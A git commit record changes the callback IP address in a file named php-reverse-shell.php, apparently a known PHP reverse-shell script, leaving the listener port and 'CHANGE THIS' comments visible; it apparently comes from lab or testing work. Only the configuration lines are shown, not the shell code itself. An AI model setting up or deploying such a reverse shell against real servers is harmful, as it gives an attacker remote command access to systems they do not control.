8b7f66cbd5dae497f5ecc3e6c908b518f5558aaa
Muhammad Syahrul Haniawan <72645722+mumeido@users.noreply.github.com>
2024-10-23 22:21:15 +0700

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '114.10.151.172';  // CHANGE THIS
+$ip = '172.20.10.3';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
